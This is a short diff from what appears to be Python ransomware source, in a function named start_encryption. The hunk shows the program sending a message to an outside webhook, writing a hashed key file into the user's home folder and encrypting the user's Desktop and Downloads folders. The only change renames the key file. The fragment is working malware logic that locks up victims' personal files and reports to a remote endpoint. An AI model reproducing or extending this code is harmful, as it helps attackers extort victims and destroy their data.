@@ -306,7 +306,7 @@ def start_encryption():
     )
     webhook.add_embed(embed)
     webhook.execute()
-    with open(os.path.join(f"C:\\Users\\{getpass.getuser()}", "key"), "wb") as f:
+    with open(os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb") as f:
         f.write(hashlib.sha256(key).hexdigest().encode())
     encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
     encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key)
